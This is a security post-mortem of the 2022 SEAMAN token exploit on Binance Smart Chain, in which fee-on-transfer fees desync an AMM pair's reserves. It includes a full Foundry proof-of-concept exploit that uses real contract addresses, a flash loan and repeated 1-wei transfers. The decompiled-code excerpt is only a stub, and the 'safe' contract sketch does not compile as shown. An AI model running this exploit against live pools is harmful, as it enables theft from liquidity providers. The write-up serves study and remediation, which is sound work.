# SEAMAN — Flash Loan + Small-Transfer Pair Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | SEAMAN Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **SEAMAN Token** | [0x6bc9b4976ba6f8C9574326375204eE469993D038](https://bscscan.com/address/0x6bc9b4976ba6f8C9574326375204eE469993D038) |
| **GVC Token** | [0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e](https://bscscan.com/address/0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Pair** | [0x6637914482670f91F43025802b6755F27050b0a6](https://bscscan.com/address/0x6637914482670f91F43025802b6755F27050b0a6) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A](https://bscscan.com/address/0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) |
| **Root Cause** | SEAMAN fee-on-transfer fees are injected directly into the pair without calling `sync()`, causing `balanceOf(pair) > reserve(pair)` discrepancies to accumulate; repeated small transfers amplify this gap, enabling extraction of excess USDT on reverse swaps |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SEAMAN_exp.sol) |

---
## 1. Vulnerability Overview

The SEAMAN token includes a fee-on-transfer mechanism and was traded in an AMM pool paired with the GVC token. The attacker borrowed 800,000 USDT via a DODO flash loan and acquired both tokens by swapping USDT→SEAMAN and USDT→GVC. They then transferred SEAMAN in small amounts (1 wei) to the pair 20 times, accumulating a `balanceOf(pair, SEAMAN) > reserve(pair, SEAMAN)` discrepancy. With this imbalanced state, the attacker executed a GVC→USDT reverse swap to extract profit at the manipulated price and repaid the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// SEAMAN fee-on-transfer mechanism
// A fixed fee is injected into the pair on every transfer
// ❌ Repeated small transfers can cause balanceOf(pair) >> reserve(pair)

// Uniswap V2-based pair — reserve vs. balanceOf desync vulnerability
// Without pair.sync(), the discrepancy persists

// ❌ Attack scenario:
// 1. Manipulate SEAMAN price via large swap
// 2. Repeated small SEAMAN transfers → balanceOf(pair) increases, reserve stays fixed
// 3. On reverse swap, extract GVC/USDT at the manipulated ratio

// ✅ Defensive pattern:
// Detect direct transfers to the pair and auto-call sync()
// Or set the fee recipient to a separate address instead of the pair
contract SafeSEAMANToken {
    address public feeRecipient; // Separate address instead of LP pair

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * transferFee / 1000;
        // ✅ Route fee to a separate recipient, not injected directly into the pair
        super._transfer(from, feeRecipient, fee);
        super._transfer(from, to, amount - fee);
        // ✅ If the fee recipient is the pair, call sync() immediately
        if (feeRecipient == pair) {
            IUniswapV2Pair(pair).sync();
        }
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**SEAMAN_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: SEAMAN fee-on-transfer fees are injected directly into the pair without calling `sync()`, causing `balanceOf(pair) > reserve(pair)` discrepancies to accumulate
    function balanceOf(address arg0) external view returns (uint256) {}  // 0x70a08231  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 800,000 USDT from DODO
    │
    ├─[2] Swap USDT → SEAMAN (PancakeSwap)
    │       Manipulate SEAMAN price (alter reserve ratio)
    │
    ├─[3] Swap USDT → GVC (PancakeSwap)
    │       Acquire GVC
    │
    ├─[4] Transfer SEAMAN in small amounts (1 wei) × 20 to pair
    │       Each transfer accumulates fee-on-transfer fees in the pair
    │       pair.balanceOf(SEAMAN) increases
    │       pair.reserve(SEAMAN) stays fixed without sync()
    │       → Reserve discrepancy accumulates
    │
    ├─[5] Reverse swap GVC → USDT
    │       Favorable exchange rate from manipulated SEAMAN/GVC ratio
    │
    ├─[6] Repay DODO flash loan
    │
    └─[7] Net profit: USDT arbitrage (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
}

contract SEAMANExploit is Test {
    IDODO  dodo   = IDODO(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 SEAMAN = IERC20(0x6bc9b4976ba6f8C9574326375204eE469993D038);
    IERC20 GVC    = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);
    IERC20 USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair  pair   = IPair(0x6637914482670f91F43025802b6755F27050b0a6);

    function setUp() public {
        vm.createSelectFork("bsc", 23_467_515);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        dodo.flashLoan(800_000 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        USDT.approve(address(router), type(uint256).max);

        // [Step 2] USDT → SEAMAN
        address[] memory path = new address[](2);
        path[0] = address(USDT); path[1] = address(SEAMAN);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount / 3, 0, path, address(this), block.timestamp
        );

        // [Step 3] USDT → GVC
        path[1] = address(GVC);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount / 3, 0, path, address(this), block.timestamp
        );

        // [Step 4] Transfer SEAMAN in small amounts (1 wei) × 20 to pair
        // ⚡ fee-on-transfer causes pair.balanceOf(SEAMAN) >> reserve discrepancy to accumulate
        for (uint256 i = 0; i < 20; i++) {
            SEAMAN.transfer(address(pair), 1);
        }

        // [Step 5] Reverse swap GVC → USDT (exploit manipulated ratio)
        GVC.approve(address(router), type(uint256).max);
        path[0] = address(GVC); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GVC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reserve desync via fee-on-transfer induced by repeated small transfers |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Flash loan → SEAMAN/GVC swap → SEAMAN 1 wei × 20 transfers to pair → GVC→USDT reverse swap |
| **Preconditions** | fee-on-transfer injected directly into pair; reserve desync persists without sync() |
| **Impact** | USDT arbitrage profit (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Auto-call sync()**: Call `pair.sync()` every time tokens are injected into the pair via fee-on-transfer to immediately update reserves.
2. **Separate fee recipient address**: Instead of injecting transfer fees directly into the LP pair, send them to a dedicated recipient address (team wallet, staking contract) to prevent reserve desync.
3. **Minimum transfer amount restriction**: Set a minimum transfer amount (`minTransfer`) to block dust-level transfers such as 1 wei.

---
## 7. Lessons Learned

- **The power of repeated small transfers**: Individually meaningless 1 wei transfers, when repeated 20 times, create reserve desync through fee accumulation. Fee-on-transfer token designs must explicitly account for repeated small-transfer patterns.
- **Importance of the fee injection path**: When transfer fees are injected directly into the LP pair, a persistent `balanceOf > reserve` state arises. This becomes a precondition for `skim()` exploits and manipulated swap attacks.
- **Recurring PLTD/SEAMAN pattern**: Attacks exploiting the reserve desync between fee-on-transfer tokens and AMMs recurred across PLTD (2022-10), SEAMAN (2022-11), and HEALTH (2022-10). This pattern represents a structural vulnerability inherent to BSC fee-on-transfer tokens.